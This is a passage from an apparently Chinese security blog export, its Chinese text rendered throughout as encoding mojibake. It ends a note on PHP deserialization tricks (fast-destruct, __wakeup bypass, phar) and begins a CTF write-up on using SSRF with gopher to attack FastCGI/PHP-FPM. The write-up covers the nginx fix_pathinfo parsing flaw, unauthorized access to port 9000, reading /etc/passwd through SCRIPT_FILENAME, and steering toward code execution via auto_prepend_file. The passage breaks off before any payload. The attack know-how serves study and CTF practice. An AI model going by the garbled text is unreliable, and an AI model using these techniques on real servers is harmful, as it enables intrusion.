å¤„ç†çš„ä¸è§„èŒƒï¼Œæœ‰å¯èƒ½PHPä¼šç›´æ¥è°ƒç”¨ææ„å‡½æ•°æ¥å°è¯•å›æ”¶æ•°ç»„å¯¹è±¡aï¼Œä½†è€ƒè™‘åˆ°ä¸Šè¿°æˆ‘ä»¬é¢˜ç›®ä¸­çš„ææ„å‡½æ•°æœ‰ç€å¯¹qwbå˜é‡çš„å¤„ç†ï¼ŒPHPå¯èƒ½ä¼šä¾æ—§å‘å†…éƒ¨è§£æï¼Œè§£æåˆ°qwbå˜é‡çš„æ—¶å€™å°†å…¶èµ‹å€¼ä¸º/flagè€ŒæˆåŠŸè¯»å–ã€‚ å¯¹äºç¬¬äºŒä¸ªçš„è¯ï¼Œä»–åœ¨è§£æåˆ°æœ€åå‘ç°ç»“æ„é”™è¯¯ï¼Œäºæ˜¯è°ƒç”¨ææ„å‡½æ•°å»å¤„ç†ï¼Œä½†ç”±äºå‰é¢å·²ç»è¢«æ­£ç¡®å®ä¾‹åŒ–äº†ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯å¯ä»¥æˆåŠŸè¯»å–åˆ°flagçš„ è¿™é‡Œæˆ‘åœ¨ä¸GPTå”‡æªèˆŒæˆ˜çš„æ—¶å€™å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œçœ‹äº†å¾ˆå¤šæ–‡ç« è¯´PHPååºåˆ—åŒ–çš„æ—¶å€™å¦‚æœ é‡åˆ°æ˜¯ç±»ä¸­åµŒå¥—ç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¼šå…ˆååºåˆ—åŒ–å†…éƒ¨ç±»åœ¨ååºåˆ—åŒ–å¤–éƒ¨ç±»ï¼Œä¸è¿‡è¿™é‡Œé—®äº†GPTå‘ç°ï¼ŒPHPååºåˆ—åŒ–å®é™…ä¸Šå°±æ˜¯ä»å·¦è‡³å³ä¾æ¬¡è§£æçš„ã€‚ æ€»çš„æ¥è¯´å¯¹äºfast-destructæ–¹æ³•å¾ˆå¤šï¼Œå¤§è‡´å°±æ˜¯æ„é€ å‡ºæ ¼å¼é”™è¯¯çš„æƒ…å†µï¼Œä½†å¯¹äºæˆ‘ä»¬æ„é€ çš„æ¶æ„ä»£ç çš„å­˜åœ¨çš„åœ°æ–¹åŸºæœ¬æ˜¯ä¸èƒ½è®©å…¶é”™è¯¯çš„ã€‚ æœ€åè¿˜å‘ç°æœ‰ä¸ªé—­åŒ…å‡½æ•°ç»•è¿‡ï¼Œä½†å…¶ä¸­çš„é“¾å­æ²¡å­¦è¿‡ï¼Œå°±ä¸æ·±ç©¶äº†ï¼Œæ”¾è¿™é‡Œçœ‹æ—¥åæœ‰ç¼˜å­¦ä¹ ä¸€ä¸‹ PHPååºåˆ—åŒ–å†·çŸ¥è¯† 0x03 å‚è€ƒæ–‡ç«  PHPååºåˆ—åŒ–å°æŠ€å·§ä¹‹Fast Destruct --è¿™ä¸ªæ–‡ç« æˆ‘è®¤ä¸ºå¯ä»¥å¾ˆå¥½çš„ç†è§£PHPååºåˆ—åŒ–çš„è¿‡ç¨‹ æ„šäººæ¯3rd [easy_php] ç»•è¿‡__wakeup() ååºåˆ—åŒ– åˆé›† ä»0å­¦ä¹ bypass open_basedirå§¿åŠ¿ PHPååºåˆ—åŒ–ä¸­wakeup()ç»•è¿‡æ€»ç»“ wakeupé­”æœ¯æ–¹æ³•ç»•è¿‡ ä»è™ç¬¦çº¿ä¸‹CTFæ·±å…¥ååºåˆ—åŒ–åˆ©ç”¨ æµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼ [phpååºåˆ—åŒ–ä¹‹ç»•è¿‡wakeup] PHPååºåˆ—åŒ–å°æŠ€å·§ prize1 prize_p1 pharååºåˆ—åŒ–+ä¸¤é“CTFä¾‹é¢˜ [pharååºåˆ—åŒ–][NSSCTF]prize_p1","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"SSRF gopheræ‰“FastCGI","path":"/2023/12/22/ssrf-da-fastcgi/","content":"0x01 å‰è¨€ æœ¬æ–‡çš„äº§ç”Ÿæ˜¯ç”±äºä¹‹å‰åˆ·CTFHubé¶åœºé‡åˆ°çš„ï¼Œçœ‹åˆ°è‡ªå·±å¯¹SSRFæ–¹é¢è¿˜æ˜¯æœ‰æ‰€æ¬ ç¼ºçš„ï¼Œè¿™é‡Œåˆé‡åˆ°äº†æ–°çŸ¥è¯†ç‚¹ï¼Œæ•…æ­¤è®°å½•ä¸€ä¸‹ã€‚ è¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨gopheråè®®ï¼š è¿™ä¸ªåè®®ä½œä¸ºSSRFæ¼æ´åˆ©ç”¨ä¸­çš„ä¸‡é‡‘æ²¹ï¼Œå¯ä»¥ç”¨å®ƒæ¥æ”»å‡»å†…ç½‘çš„FTPã€Telnetã€Redisã€Memcacheã€FastCGIç­‰åº”ç”¨ï¼Œé‚£ä¹ˆè¿™ç¯‡æ–‡ç« å°±æ¥ä»‹ç»ä¸€ä¸‹FastCGIä»¥åŠåˆ©ç”¨SSRFç»“åˆGopheråè®®æ”»å‡»FastCGI 0x02 FastCGI è¿™é‡Œå¤šä¸ºå…¶ä»–å¤§å¸ˆå‚…çš„çŸ¥è¯†æ€»ç»“ï¼Œè¿˜è¯·è§è°…~~ è¿™é‡Œå…ˆç»™å‡ºç»´åŸºç™¾ç§‘å¯¹å…¶çš„è§£é‡Šï¼š å¿«é€Ÿé€šç”¨ç½‘å…³æ¥å£ï¼ˆFast Common Gateway Interfaceï¼FastCGIï¼‰æ˜¯ä¸€ç§è®©äº¤äº’ç¨‹åºä¸WebæœåŠ¡å™¨é€šä¿¡çš„åè®®ã€‚FastCGIæ˜¯æ—©æœŸé€šç”¨ç½‘å…³æ¥å£ï¼ˆCGIï¼‰çš„å¢å¼ºç‰ˆæœ¬ã€‚FastCGIè‡´åŠ›äºå‡å°‘ç½‘é¡µæœåŠ¡å™¨ä¸CGIç¨‹åºä¹‹é—´äº¤äº’çš„å¼€é”€ï¼Œä»è€Œä½¿æœåŠ¡å™¨å¯ä»¥åŒæ—¶å¤„ç†æ›´å¤šçš„ç½‘é¡µè¯·æ±‚ã€‚ åªé€šè¿‡è¿™æ ·ç®€å•ä¸¤å¥è¯ç¡®å®éš¾ä»¥ç†è§£è¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆåè®®ï¼Œä¸‹é¢æ˜¯æˆ‘é€šè¿‡é˜…è¯»å„ç§èµ„æ–™åå¯¹è¿™ä¸ªåè®®çš„ç†è§£ ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ç½‘ç«™åˆ†ç±»ä¸­å­˜åœ¨ä¸€ç§åˆ†ç±»å°±æ˜¯é™æ€ç½‘ç«™å’ŒåŠ¨æ€ç½‘ç«™ï¼Œä¸¤è€…çš„åŒºåˆ«å°±æ˜¯é™æ€ç½‘ç«™åªéœ€è¦é€šè¿‡æµè§ˆå™¨è¿›è¡Œè§£æï¼Œå…¶ä¸­çš„é¡µé¢æ˜¯ä¸€å¯¹ä¸€çš„(ä¸€ä¸ªå†…å®¹å¯¹åº”ä¸€ä¸ªé¡µé¢)ï¼Œè€ŒåŠ¨æ€ç½‘ç«™éœ€è¦ä¸€ä¸ªé¢å¤–çš„ç¼–è¯‘è§£æçš„è¿‡ç¨‹ï¼Œç½‘é¡µä¸Šçš„æ•°æ®æ˜¯ä»æ•°æ®åº“ä¸­æˆ–è€…å…¶ä»–åœ°æ–¹è°ƒç”¨ï¼Œé¡µé¢ä¼šéšç€æ•°æ®çš„å˜åŒ–è€Œæ”¹å˜ï¼Œå°±äº§ç”Ÿäº†ä¸€å®šçš„äº¤äº’æ€§ã€‚ æµè§ˆå™¨è®¿é—®é™æ€ç½‘é¡µè¿‡ç¨‹ åœ¨æ•´ä¸ªç½‘é¡µçš„è®¿é—®è¿‡ç¨‹ä¸­ï¼ŒWebå®¹å™¨(ä¾‹å¦‚Apacheã€Nginx)åªæ‹…ä»»ç€å†…å®¹åˆ†å‘è€…çš„èº«ä»½ï¼Œå½“è®¿é—®é™æ€ç½‘ç«™çš„ä¸»é¡µæ—¶ï¼ŒWebå®¹å™¨ä¼šåˆ°ç½‘ç«™çš„ç›¸åº”ç›®å½•ä¸­æŸ¥æ‰¾ä¸»é¡µæ–‡ä»¶ï¼Œç„¶åå‘é€ç»™ç”¨æˆ·çš„æµè§ˆå™¨ã€‚ æµè§ˆå™¨è®¿é—®åŠ¨æ€ç½‘é¡µè¿‡ç¨‹ å½“è®¿é—®åŠ¨æ€ç½‘ç«™çš„ä¸»é¡µæ—¶ï¼Œæ ¹æ®å®¹å™¨çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒçŸ¥é“è¿™ä¸ªé¡µé¢ä¸æ˜¯é™æ€é¡µé¢ï¼Œwebå®¹å™¨å°±ä¼šå»æ‰¾PHPè§£æå™¨æ¥è¿›è¡Œå¤„ç†(è¿™é‡Œä»¥Apacheä¸ºä¾‹)ï¼Œå®ƒä¼šæŠŠè¿™ä¸ªè¯·æ±‚è¿›è¡Œç®€å•çš„å¤„ç†ï¼Œç„¶åäº¤ç»™PHPè§£é‡Šå™¨ã€‚ å½“Apacheæ”¶åˆ°ç”¨æˆ·å¯¹ index.php çš„è¯·æ±‚åï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯CGIï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åºï¼Œå¯¹åº”åœ¨è¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šCGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€PHP Webè®¿é—®æµç¨‹ã€‚ è¿™é‡Œè¯´çš„æ˜¯ä½¿ç”¨CGIï¼Œè€ŒFastCGIå°±ç›¸å½“äºé«˜æ€§èƒ½çš„CGIï¼Œä¸CGIä¸åŒçš„æ˜¯å®ƒåƒä¸€ä¸ªå¸¸é©»çš„CGIï¼Œåœ¨å¯åŠ¨åä¼šä¸€ç›´è¿è¡Œç€ï¼Œä¸éœ€è¦æ¯æ¬¡å¤„ç†æ•°æ®æ—¶éƒ½å¯åŠ¨ä¸€æ¬¡ï¼Œ æ‰€ä»¥è¿™é‡Œå¼•å‡ºä¸‹é¢è¿™å¥æ¦‚å¿µï¼ŒFastCGIæ˜¯è¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„CGIå¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°†CGIè§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­ï¼Œå¹¶å› æ­¤è·å¾—è¾ƒé«˜çš„æ€§èƒ½ ã€‚ FastCGI Record HTTPåè®®æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¸­é—´ä»¶è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œæµè§ˆå™¨å°†HTTPå¤´å’ŒHTTPä½“ç”¨æŸä¸ªè§„åˆ™ç»„è£…æˆæ•°æ®åŒ…ï¼Œä»¥TCPçš„æ–¹å¼å‘é€åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶æŒ‰ç…§è§„åˆ™å°†æ•°æ®åŒ…è§£ç ï¼Œå¹¶æŒ‰è¦æ±‚æ‹¿åˆ°ç”¨æˆ·éœ€è¦çš„æ•°æ®ï¼Œå†ä»¥HTTPåè®®çš„è§„åˆ™æ‰“åŒ…è¿”å›ç»™æœåŠ¡å™¨ã€‚ ç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚ å’ŒHTTPå¤´ä¸åŒï¼Œrecordçš„å¤´å›ºå®š8ä¸ªå­—èŠ‚ï¼Œbodyæ˜¯ç”±å¤´ä¸­çš„contentLengthæŒ‡å®šï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š typedef struct { /* Header */ unsigned char version; // ç‰ˆæœ¬ unsigned char type; // æœ¬æ¬¡recordçš„ç±»å‹ unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id unsigned char requestIdB0; unsigned char contentLengthB1; // bodyä½“çš„å¤§å° unsigned char contentLengthB0; unsigned char paddingLength; // é¢å¤–å—å¤§å° unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record; å¤´ç”±8ä¸ªucharç±»å‹çš„å˜é‡ç»„æˆï¼Œæ¯ä¸ªå˜é‡1å­—èŠ‚ã€‚å…¶ä¸­ï¼ŒrequestIdå ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå”¯ä¸€çš„æ ‡å¿—idï¼Œä»¥é¿å…å¤šä¸ªè¯·æ±‚ä¹‹é—´çš„å½±å“ï¼›contentLengthå ä¸¤ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºbodyçš„å¤§å°ã€‚ è¯­è¨€ç«¯è§£æäº†fastcgiå¤´ä»¥åï¼Œæ‹¿åˆ°contentLengthï¼Œç„¶åå†åœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLengthçš„æ•°æ®ï¼Œè¿™å°±æ˜¯bodyä½“ã€‚ Bodyåé¢è¿˜æœ‰ä¸€æ®µé¢å¤–çš„æ•°æ®ï¼ˆPaddingï¼‰ï¼Œå…¶é•¿åº¦ç”±å¤´ä¸­çš„paddingLengthæŒ‡å®šï¼Œèµ·ä¿ç•™ä½œç”¨ã€‚ä¸éœ€è¦è¯¥Paddingçš„æ—¶å€™ï¼Œå°†å…¶é•¿åº¦è®¾ç½®ä¸º0å³å¯ã€‚ å¯è§ï¼Œä¸€ä¸ªfastcgi recordç»“æ„æœ€å¤§æ”¯æŒçš„bodyå¤§å°æ˜¯2^16ï¼Œä¹Ÿå°±æ˜¯65536å­—èŠ‚ã€‚ FastCGI Type typeå°±æ˜¯æŒ‡å®šè¯¥recordçš„ä½œç”¨ã€‚å› ä¸ºfastcgiä¸€ä¸ªrecordçš„å¤§å°æ˜¯æœ‰é™çš„ï¼Œä½œç”¨ä¹Ÿæ˜¯å•ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªTCPæµé‡Œä¼ è¾“å¤šä¸ªrecordã€‚é€šè¿‡typeæ¥æ ‡å¿—æ¯ä¸ªrecordçš„ä½œç”¨ï¼Œç”¨requestIdä½œä¸ºåŒä¸€æ¬¡è¯·æ±‚çš„idã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è¯·æ±‚ï¼Œä¼šæœ‰å¤šä¸ªrecordï¼Œä»–ä»¬çš„requestIdæ˜¯ç›¸åŒçš„ã€‚ å€Ÿç”¨è¯¥æ–‡ç« ä¸­çš„ä¸€ä¸ªè¡¨æ ¼ï¼Œåˆ—å‡ºæœ€ä¸»è¦çš„å‡ ç§typeï¼š çœ‹äº†è¿™ä¸ªè¡¨æ ¼å°±å¾ˆæ¸…æ¥šäº†ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å’Œåç«¯è¯­è¨€é€šä¿¡ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°±æ˜¯typeä¸º1çš„recordï¼Œåç»­äº’ç›¸äº¤æµï¼Œå‘é€typeä¸º4ã€5ã€6ã€7çš„recordï¼Œç»“æŸæ—¶å‘é€typeä¸º2ã€3çš„recordã€‚ å½“åç«¯è¯­è¨€æ¥æ”¶åˆ°ä¸€ä¸ªtypeä¸º4çš„recordåï¼Œå°±ä¼šæŠŠè¿™ä¸ªrecordçš„bodyæŒ‰ç…§å¯¹åº”çš„ç»“æ„è§£ææˆkey-valueå¯¹ï¼Œè¿™å°±æ˜¯ç¯å¢ƒå˜é‡ã€‚ 0x03 PHP-FPM å®˜æ–¹å¯¹å®ƒçš„è§£é‡Šæ˜¯FPMï¼ˆFastCGI è¿›ç¨‹ç®¡ç†å™¨ï¼‰ç”¨äºæ›¿æ¢ PHP FastCGI çš„å¤§éƒ¨åˆ†é™„åŠ åŠŸèƒ½ï¼Œå¯¹äºé«˜è´Ÿè½½ç½‘ç«™æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´php-fpmæ˜¯FastCGIçš„ä¸€ä¸ªå…·ä½“å®ç°ï¼Œå¹¶ä¸”æä¾›äº†è¿›ç¨‹ç®¡ç†çš„åŠŸèƒ½ï¼Œåœ¨å…¶ä¸­çš„è¿›ç¨‹ä¸­ï¼ŒåŒ…å«äº†masterå’Œworkerè¿›ç¨‹ï¼Œè¿™ä¸ªåœ¨åé¢æˆ‘ä»¬è¿›è¡Œç¯å¢ƒæ­å»ºçš„æ—¶å€™å¯ä»¥é€šè¿‡å‘½ä»¤æŸ¥çœ‹ã€‚å…¶ä¸­master è¿›ç¨‹è´Ÿè´£ä¸ Web æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œæ¥æ”¶ HTTP è¯·æ±‚ï¼Œå†å°†è¯·æ±‚è½¬å‘ç»™ worker è¿›ç¨‹è¿›è¡Œå¤„ç†ï¼Œ**worker è¿›ç¨‹ä¸»è¦è´Ÿè´£åŠ¨æ€æ‰§è¡Œ PHP ä»£ç ï¼Œ**å¤„ç†å®Œæˆåï¼Œå°†å¤„ç†ç»“æœè¿”å›ç»™ Web æœåŠ¡å™¨ï¼Œå†ç”± Web æœåŠ¡å™¨å°†ç»“æœå‘é€ç»™å®¢æˆ·ç«¯ã€‚ é‚£å®é™…ä¸Šå‘¢FPMå…¶å®æ˜¯ä¸€ä¸ªfastcgiåè®®è§£æå™¨ï¼ŒNginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚ FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œç”¨æˆ·è®¿é—®http://127.0.0.1/index.php?a=1&amp;b=2ï¼Œå¦‚æœwebç›®å½•æ˜¯/var/www/htmlï¼Œé‚£ä¹ˆNginxä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹key-valueå¯¹ï¼š { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' } è¿™ä¸ªæ•°ç»„å…¶å®å°±æ˜¯PHPä¸­$_SERVERæ•°ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯PHPé‡Œçš„ç¯å¢ƒå˜é‡ã€‚ä½†ç¯å¢ƒå˜é‡çš„ä½œç”¨ä¸ä»…æ˜¯å¡«å……$_SERVERæ•°ç»„ï¼Œä¹Ÿæ˜¯å‘Šè¯‰fpmï¼šâ€œæˆ‘è¦æ‰§è¡Œå“ªä¸ªPHPæ–‡ä»¶â€ã€‚ PHP-FPMæ‹¿åˆ°fastcgiçš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œæ‰§è¡ŒSCRIPT_FILENAMEçš„å€¼æŒ‡å‘çš„PHPæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯/var/www/html/index.phpã€‚ Nginxï¼ˆIIS7ï¼‰è§£ææ¼æ´ Nginxå’ŒIIS7æ›¾ç»å‡ºç°è¿‡ä¸€ä¸ªPHPç›¸å…³çš„è§£ææ¼æ´ï¼ˆæµ‹è¯•ç¯å¢ƒhttps://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerabilityï¼‰ï¼Œè¯¥æ¼æ´ç°è±¡æ˜¯ï¼Œåœ¨ç”¨æˆ·è®¿é—®http://127.0.0.1/favicon.ico/.phpæ—¶ï¼Œè®¿é—®åˆ°çš„æ–‡ä»¶æ˜¯favicon.icoï¼Œä½†å´æŒ‰ç…§.phpåç¼€è§£æäº†ã€‚ ç”¨æˆ·è¯·æ±‚http://127.0.0.1/favicon.ico/.phpï¼Œnginxå°†ä¼šå‘é€å¦‚ä¸‹ç¯å¢ƒå˜é‡åˆ°fpmé‡Œï¼š { ... 'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php', 'SCRIPT_NAME': '/favicon.ico/.php', 'REQUEST_URI': '/favicon.ico/.php', 'DOCUMENT_ROOT': '/var/www/html', ... } æ­£å¸¸æ¥è¯´ï¼ŒSCRIPT_FILENAMEçš„å€¼æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶/var/www/html/favicon.ico/.phpï¼Œæ˜¯PHPè®¾ç½®ä¸­çš„ä¸€ä¸ªé€‰é¡¹fix_pathinfoå¯¼è‡´äº†è¿™ä¸ªæ¼æ´ã€‚PHPä¸ºäº†æ”¯æŒPath Infoæ¨¡å¼è€Œåˆ›é€ äº†fix_pathinfoï¼Œåœ¨è¿™ä¸ªé€‰é¡¹è¢«æ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œfpmä¼šåˆ¤æ–­SCRIPT_FILENAMEæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å»æ‰æœ€åä¸€ä¸ª/åŠä»¥åçš„æ‰€æœ‰å†…å®¹ï¼Œå†æ¬¡åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¾€æ¬¡å¾ªç¯ï¼Œç›´åˆ°æ–‡ä»¶å­˜åœ¨ã€‚ æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡fpmå‘ç°/var/www/html/favicon.ico/.phpä¸å­˜åœ¨ï¼Œåˆ™å»æ‰/.phpï¼Œå†åˆ¤æ–­/var/www/html/favicon.icoæ˜¯å¦å­˜åœ¨ã€‚æ˜¾ç„¶è¿™ä¸ªæ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œäºæ˜¯è¢«ä½œä¸ºPHPæ–‡ä»¶æ‰§è¡Œï¼Œå¯¼è‡´è§£ææ¼æ´ã€‚ æ­£ç¡®çš„è§£å†³æ–¹æ³•æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯åœ¨Nginxç«¯ä½¿ç”¨fastcgi_split_path_infoå°†path infoä¿¡æ¯å»é™¤åï¼Œç”¨tryfilesåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›äºŒæ˜¯å€ŸåŠ©PHP-FPMçš„security.limit_extensionsé…ç½®é¡¹ï¼Œé¿å…å…¶ä»–åç¼€æ–‡ä»¶è¢«è§£æã€‚ security.limit_extensionsé…ç½® å†™åˆ°è¿™é‡Œï¼ŒPHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº†ã€‚PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚ æ­¤æ—¶ï¼ŒSCRIPT_FILENAMEçš„å€¼å°±æ ¼å¤–é‡è¦äº†ã€‚å› ä¸ºfpmæ˜¯æ ¹æ®è¿™ä¸ªå€¼æ¥æ‰§è¡Œphpæ–‡ä»¶çš„ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶ä¸å­˜åœ¨ï¼Œfpmä¼šç›´æ¥è¿”å›404ï¼š åœ¨fpmæŸä¸ªç‰ˆæœ¬ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å°†SCRIPT_FILENAMEçš„å€¼æŒ‡å®šä¸ºä»»æ„åç¼€æ–‡ä»¶ï¼Œæ¯”å¦‚/etc/passwdï¼›ä½†åæ¥ï¼Œfpmçš„é»˜è®¤é…ç½®ä¸­å¢åŠ äº†ä¸€ä¸ªé€‰é¡¹security.limit_extensionsï¼š ; Limits the extensions of the main script FPM will allow to parse. This can ; prevent configuration mistakes on the web server side. You should only limit ; FPM to .php extensions to prevent malicious users to use other extensions to ; exectute php code. ; Note: set an empty value to allow all extensions. ; Default Value: .php ;security.limit_extensions = .php .php3 .php4 .php5 .php7 å…¶é™å®šäº†åªæœ‰æŸäº›åç¼€çš„æ–‡ä»¶å…è®¸è¢«fpmæ‰§è¡Œï¼Œé»˜è®¤æ˜¯.phpã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å†ä¼ å…¥/etc/passwdçš„æ—¶å€™ï¼Œå°†ä¼šè¿”å›Access denied.ï¼š ç”±äºè¿™ä¸ªé…ç½®é¡¹çš„é™åˆ¶ï¼Œå¦‚æœæƒ³åˆ©ç”¨PHP-FPMçš„æœªæˆæƒè®¿é—®æ¼æ´ï¼Œé¦–å…ˆå°±å¾—æ‰¾åˆ°ä¸€ä¸ªå·²å­˜åœ¨çš„PHPæ–‡ä»¶ã€‚ ä¸‡å¹¸çš„æ˜¯ï¼Œé€šå¸¸ä½¿ç”¨æºå®‰è£…phpçš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¸Šéƒ½ä¼šé™„å¸¦ä¸€äº›phpåç¼€çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨find / -name \"*.php\"æ¥å…¨å±€æœç´¢ä¸€ä¸‹é»˜è®¤ç¯å¢ƒï¼š æ‰¾åˆ°äº†ä¸å°‘ã€‚è¿™å°±ç»™æˆ‘ä»¬æä¾›äº†ä¸€æ¡æ€è·¯ï¼Œå‡è®¾æˆ‘ä»¬çˆ†ç ´ä¸å‡ºæ¥ç›®æ ‡ç¯å¢ƒçš„webç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾æ‰¾é»˜è®¤æºå®‰è£…åå¯èƒ½å­˜åœ¨çš„phpæ–‡ä»¶ï¼Œæ¯”å¦‚/usr/local/lib/php/PEAR.phpã€‚ ä»»æ„ä»£ç æ‰§è¡Œ é‚£åœ¨ä¸Šè¿°æ¡ä»¶ä¸‹æˆ‘ä»¬å³ä½¿SCRIPT_FILENAMEå¯æ§ï¼Œä½†ç”±äºå…¶å¯¹äºæ–‡ä»¶åç¼€çš„é™åˆ¶ä»¥åŠå¦‚æœèµ·æœåŠ¡å™¨ä¸Šæ²¡æœ‰ç›¸åº”çš„æ–‡ä»¶ï¼Œåˆ™å…¶ä¼šæ— æ³•æ‰§è¡Œæ–‡ä»¶è€Œè¿”å›404çš„ç‰¹æ€§ï¼Œå°±ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦å…¶æ‰§è¡Œçš„æ¶æ„æ–‡ä»¶äº†ï¼Œåªèƒ½æ‰§è¡Œå…¶æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ–‡ä»¶ã€‚ é‚£æˆ‘ä»¬å¦‚ä½•æ‰èƒ½è®©å…¶æ‰§è¡Œæ¶æ„æ–‡ä»¶å‘¢ï¼Œè¿™å°±éœ€è¦ä»¥ä¸‹ä¸¤ä¸ªé…ç½®é¡¹ï¼šauto_prepend_fileå’Œauto_append_fileã€‚ auto_append_file #åœ¨æ‰§è¡Œphpæ–‡ä»¶åè‡ªåŠ¨åŒ…å«ä¸€ä¸ªæŒ‡å®šæ–‡ä»¶ auto_prepend_file 